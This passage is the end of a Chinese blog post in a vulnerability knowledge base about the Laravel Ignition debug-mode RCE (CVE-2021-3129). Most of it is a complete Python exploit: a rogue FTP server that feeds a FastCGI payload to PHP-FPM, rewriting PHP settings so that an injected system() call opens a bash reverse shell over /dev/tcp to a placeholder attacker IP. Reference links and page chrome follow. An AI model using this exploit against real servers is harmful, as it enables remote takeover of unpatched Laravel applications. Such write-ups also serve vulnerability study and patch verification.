</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%01%</span><span class="s2">01</span><span class="si">%00%</span><span class="s2">01</span><span class="si">%00%</span><span class="s2">08</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">01</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%01%</span><span class="s2">04</span><span class="si">%00%</span><span class="s2">01</span><span class="si">%01%</span><span class="s2">07</span><span class="si">%07%</span><span class="s2">00</span><span class="si">%0F</span><span class="s2">%10SERVER_SOFTWAREgo%20/</span><span class="si">%20f</span><span class="s2">cgiclient</span><span class="si">%20%</span><span class="s2">0B%09REMOTE_ADDR127.0.0.1</span><span class="si">%0F</span><span class="s2">%08SERVER_PROTOCOLHTTP/1.1</span><span class="si">%0E</span><span class="s2">%03CONTENT_LENGTH106</span><span class="si">%0E</span><span class="s2">%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include</span><span class="si">%20%</span><span class="s2">3D%20On%0Adisable_functions</span><span class="si">%20%</span><span class="s2">3D</span><span class="si">%20%</span><span class="s2">0Aauto_prepend_file</span><span class="si">%20%</span><span class="s2">3D%20php%3A//input</span><span class="si">%0F</span><span class="s2">%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">01</span><span class="si">%04%</span><span class="s2">00</span><span class="si">%01%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">01</span><span class="si">%05%</span><span class="s2">00</span><span class="si">%01%</span><span class="s2">00j</span><span class="si">%04%</span><span class="s2">00%3C</span><span class="si">%3F</span><span class="s2">php</span><span class="si">%20s</span><span class="s2">ystem</span><span class="si">%28%</span><span class="s2">27bash%20-c</span><span class="si">%20%</span><span class="s2">22bash%20-i</span><span class="si">%20%</span><span class="s2">3E</span><span class="si">%26%</span><span class="s2">20/dev/tcp/xxx.xxx.xxx.xxx/9999</span><span class="si">%200%</span><span class="s2">3E</span><span class="si">%261%</span><span class="s2">22</span><span class="si">%27%</span><span class="s2">29%3Bdie</span><span class="si">%28%</span><span class="s2">27-----Made-by-SpyD3r-----%0A</span><span class="si">%27%</span><span class="s2">29%3B</span><span class="si">%3F%3E%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">23</span>
</span></span><span class="line"><span class="cl"><span class="n">sk</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sk</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sk</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ftp被动模式的passvie port,监听到1234</span>
</span></span><span class="line"><span class="cl"><span class="n">sk2</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sk2</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="mi">1234</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sk2</span><span class="o">.</span><span class="n">listen</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 计数器，用于区分是第几次ftp连接</span>
</span></span><span class="line"><span class="cl"><span class="n">count</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="p">,</span> <span class="n">address</span> <span class="o">=</span> <span class="n">sk</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;200 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># USER aaa\r\n  客户端传来用户名</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;220 ready</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;200 ready</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>   <span class="c1"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;215 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;200 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># SIZE /123\r\n  客户端询问文件/123的大小</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;213 3 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;300 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># EPSV\r\n&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;200 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>   <span class="c1"># PASV\r\n  客户端告诉服务端进入被动连接模式</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;227 127,0,0,1,4,210</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  <span class="c1"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;227 127,0,0,1,35,40</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  <span class="c1"># 端口计算规则：35*256+40=9000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;125 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># 告诉客户端可以开始数据链接了</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 新建一个socket给服务端返回我们的payload</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;建立连接!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn2</span><span class="p">,</span> <span class="n">address2</span> <span class="o">=</span> <span class="n">sk2</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;断开连接!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;150 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;226 </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="参考文章">参考文章</h2>
<p><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener noreffer">米斯特团队|漏洞分析 | Laravel Debug页面RCE（CVE-2021-3129）分析复现</a>
</p>
<p><a href="https://mp.weixin.qq.com/s/UPf62W0LoOGsFAdH4uqBcQ" target="_blank" rel="noopener noreffer">陌陌安全|FTP利用|LARAVEL的那个RCE最有趣的点在这里</a>
</p>
<p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener noreffer">原作者漏洞分析</a>
</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-12-08</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/" data-title="Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/" data-title="Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/" data-title="Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/" data-title="Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/" class="prev" rel="prev" title="LimeSurvey LimeSurveyFileManager.php 后台任意文件读取漏洞 CVE-2020-11455"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>LimeSurvey LimeSurveyFileManager.php 后台任意文件读取漏洞 CVE-2020-11455</a>
            <a href="/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/" class="next" rel="next" title="Laravel Filemanager插件 download 任意文件读取漏洞 CVE-2022-40734">Laravel Filemanager插件 download 任意文件读取漏洞 CVE-2022-40734<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
